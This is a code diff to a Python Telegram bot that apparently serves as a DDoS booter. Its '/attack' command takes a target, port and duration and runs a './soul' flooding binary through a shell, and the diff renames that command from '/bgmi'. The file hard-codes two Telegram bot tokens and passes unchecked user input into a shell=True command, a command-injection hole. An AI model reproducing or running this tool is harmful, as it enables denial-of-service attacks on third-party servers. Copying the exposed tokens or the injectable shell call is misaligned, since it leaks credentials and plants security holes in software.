@@ -7,7 +7,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7786469113:AAFjWtBSS24y3aVgEBFvcwbLNGHwcpQRg5g')
+bot = telebot.TeleBot('8024319749:AAH1wbBFmA0a30UZWaQb7t-3FBW1_QMghaM')
 
 # Admin user IDs
 admin_id = ["1817896911"]
@@ -287,7 +287,7 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /attack command
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['attack'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -314,7 +314,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./soul {target} {port} {time} 877"
                 process = subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                response = f"ATTACK Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
             response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
